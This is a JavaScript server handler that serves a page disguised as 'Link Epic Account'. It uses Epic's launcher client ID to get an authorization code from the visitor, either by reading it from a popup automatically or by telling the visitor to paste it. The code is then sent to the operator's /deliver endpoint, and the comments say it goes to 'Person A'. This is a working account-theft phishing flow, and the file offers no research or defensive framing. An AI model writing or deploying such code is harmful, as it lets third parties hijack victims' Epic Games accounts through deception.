/**
 * GET /pop/:token
 *
 * Person B lands here. Immediately redirects their browser to the
 * Epic OAuth2 authorization URL using OUR OWN registered client.
 *
 * Epic redirects back to /callback?code=AUTH_CODE&state=TOKEN
 * which is on our domain — no cross-origin, no popups, no tricks.
 *
 * Flow (zero friction for Person B):
 *   Click link → /go/:token → /pop/:token → Epic login (skipped if logged in)
 *   → /callback?code=...&state=TOKEN → code delivered to Person A
 *
 * If EOS_CLIENT_ID env var is not set yet, falls back to the
 * launcherAppClient2 popup method with manual paste as last resort.
 */
import { getSession } from './_db.js';

const LAUNCHER_ID = '34a02cf8f4414e29b15921876da36f9a';

export default async function handler(req, res) {
  const token = String(req.url.split('/pop/')[1] || '').split('?')[0].trim();

  const s = await getSession(token);
  if (!s) {
    res.setHeader('Content-Type', 'text/html');
    return res.status(410).send(`<html><body style="background:#080808;color:#888;font-family:sans-serif;padding:40px;text-align:center">
      <p>Session expired. Ask for a new link.</p></body></html>`);
  }

  const base        = `https://${req.headers.host}`;
  const deliverUrl  = `${base}/deliver`;
  const callbackUrl = `${base}/callback`;

  // ── If we have our own EOS client registered → use proper OAuth2 ──
  const EOS_CLIENT_ID = process.env.EOS_CLIENT_ID;
  if (EOS_CLIENT_ID) {
    // Standard OAuth2 authorization code flow — Epic redirects to /callback
    // with ?code=AUTH_CODE&state=TOKEN automatically. Zero friction.
    const epicOAuthUrl = new URL('https://www.epicgames.com/id/authorize');
    epicOAuthUrl.searchParams.set('client_id',    EOS_CLIENT_ID);
    epicOAuthUrl.searchParams.set('response_type','code');
    epicOAuthUrl.searchParams.set('redirect_uri', callbackUrl);
    epicOAuthUrl.searchParams.set('state',        token);
    // scope: basic_profile is enough to get an auth code we can exchange
    epicOAuthUrl.searchParams.set('scope',        'basic_profile');

    console.log(`[POP] token=${token.slice(0,8)} → OAuth2 redirect (EOS client)`);
    res.setHeader('Location', epicOAuthUrl.toString());
    return res.status(302).end();
  }

  // ── Fallback: launcherAppClient2 popup + paste ────────────────────
  // Used until EOS_CLIENT_ID is configured.
  const epicDirect = `https://www.epicgames.com/id/api/redirect?clientId=${LAUNCHER_ID}&responseType=code`;
  console.log(`[POP] token=${token.slice(0,8)} → popup fallback (no EOS_CLIENT_ID)`);

  res.setHeader('Content-Type', 'text/html');
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Link Epic Account</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{background:#080808;color:#d0d0d0;font-family:-apple-system,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
    .card{background:#101010;border:1px solid #1e1e1e;border-radius:20px;padding:40px 36px;max-width:460px;width:100%}
    .spinner{width:36px;height:36px;border:3px solid #1e1e1e;border-top-color:#00e676;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto 20px}
    @keyframes spin{to{transform:rotate(360deg)}}
    h2{color:#fff;font-size:1.2em;margin-bottom:8px;text-align:center}
    .sub{color:#555;font-size:0.85em;line-height:1.6;margin-bottom:20px;text-align:center}
    .st{font-size:0.85em;color:#00e676;min-height:20px;margin-bottom:16px;text-align:center}
    .st.err{color:#ff5252}
    .step{display:flex;align-items:flex-start;gap:12px;margin-bottom:10px;background:#141414;border:1px solid #222;border-radius:10px;padding:12px 14px}
    .sn{width:22px;height:22px;border-radius:50%;background:#0e2a0e;color:#00e676;font-size:0.78em;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
    .st-txt{font-size:0.83em;color:#888;line-height:1.5}
    .st-txt strong{color:#ccc}
    .open-btn{display:block;width:100%;background:#00e676;color:#000;border:none;border-radius:10px;padding:14px;font-size:0.95em;font-weight:700;cursor:pointer;margin:20px 0 14px;transition:opacity .15s}
    .open-btn:hover{opacity:.85}
    .paste-label{font-size:0.75em;color:#444;text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px}
    input{width:100%;background:#161616;border:2px solid #252525;border-radius:10px;color:#fff;padding:13px 14px;font-size:1em;font-family:monospace;outline:none;transition:border .15s;letter-spacing:.04em}
    input:focus{border-color:#00e676}
    input::placeholder{color:#2a2a2a}
    .hint{font-size:0.78em;color:#333;margin-top:6px;text-align:center}
    .success{display:none;text-align:center;padding:10px 0}
    .success.show{display:block}
    .success .icon{font-size:2.4em;margin-bottom:10px}
    .success h2{color:#00e676}
    .success p{color:#555;font-size:0.85em;margin-top:8px}
  </style>
</head>
<body>
<div class="card">
  <div id="mainView">
    <div class="spinner" id="spin"></div>
    <h2>Link Epic Account</h2>
    <p class="sub">Follow the steps — takes about 10 seconds.</p>
    <div class="st" id="st"></div>

    <div class="step"><div class="sn">1</div><div class="st-txt">Click <strong>Open Epic</strong> below</div></div>
    <div class="step"><div class="sn">2</div><div class="st-txt">In the new tab, find <strong>"authorizationCode"</strong> and copy the 32-char value next to it</div></div>
    <div class="step"><div class="sn">3</div><div class="st-txt">Paste it below — submits automatically</div></div>

    <button class="open-btn" id="openBtn" onclick="openEpic()">Open Epic → Get Code</button>

    <div class="paste-label">Paste code here</div>
    <input type="text" id="ci" placeholder="490e1df4d3c14c60ae6834b0cab580e8" maxlength="36" autocomplete="off" spellcheck="false">
    <div class="hint">Pastes and submits automatically · code expires in ~5 min</div>
  </div>
  <div class="success" id="sv">
    <div class="icon">✅</div><h2>Account Linked!</h2><p>You can close this window.</p>
  </div>
</div>
<script>
const TOKEN='${token}';const DELIVER_URL='${deliverUrl}';const EPIC_URL='${epicDirect}';
let submitted=false;
function setSt(m,e){const el=document.getElementById('st');el.textContent=m;el.className='st'+(e?' err':'');}
function showSuccess(){document.getElementById('mainView').style.display='none';document.getElementById('sv').className='success show';}
function extractCode(t){const m=t.match(/"authorizationCode"\\s*:\\s*"([a-f0-9]{32})"/i)||t.match(/[?&]code=([a-f0-9]{32})/i);return m?m[1]:null;}
async function deliver(code){
  if(submitted)return;submitted=true;
  setSt('Submitting…');
  try{
    const r=await fetch(DELIVER_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:TOKEN,code})});
    const d=await r.json();
    if(d.ok){showSuccess();}else{submitted=false;setSt('Error: '+(d.error||'unknown'),true);}
  }catch(e){submitted=false;setSt('Network error',true);}
}
function openEpic(){
  document.getElementById('spin').style.display='none';
  window.open(EPIC_URL,'_blank');
  setSt('Epic tab opened — copy the authorizationCode value and paste below ↓');
  setTimeout(()=>document.getElementById('ci').focus(),300);
}
document.getElementById('ci').addEventListener('input',function(){
  const v=this.value.trim().replace(/[^a-f0-9]/gi,'');
  if(v.length===32&&!submitted){setSt('Code detected — submitting…');setTimeout(()=>deliver(v.toLowerCase()),150);}
});
// Auto-open Epic on load, try popup capture
(function(){
  const w=520,h=680,left=Math.max(0,(screen.width-w)/2),top=Math.max(0,(screen.height-h)/2);
  const popup=window.open(EPIC_URL,'epicauth','width='+w+',height='+h+',left='+left+',top='+top+',toolbar=no,menubar=no');
  if(!popup||popup.closed){setSt('');return;}
  setSt('Attempting auto-capture…');
  let ticks=0;
  const t=setInterval(()=>{
    ticks++;
    if(!popup||popup.closed){clearInterval(t);if(!submitted)setSt('');return;}
    let href=null;try{href=popup.location.href;}catch(_){}
    if(href&&href!=='about:blank'){
      let code=extractCode(href);
      if(!code){try{const b=popup.document?.body?.innerText||'';code=extractCode(b);}catch(_){}}
      if(code){clearInterval(t);popup.close();deliver(code);return;}
      if(href.includes('localhost')||href.includes('chrome-error')||href.includes('about:neterror')){
        clearInterval(t);popup.close();setSt('');
      }
    }
    if(ticks>180){clearInterval(t);if(!submitted){popup.close();setSt('');}}
  },500);
})();
</script>
</body>
</html>`);
}
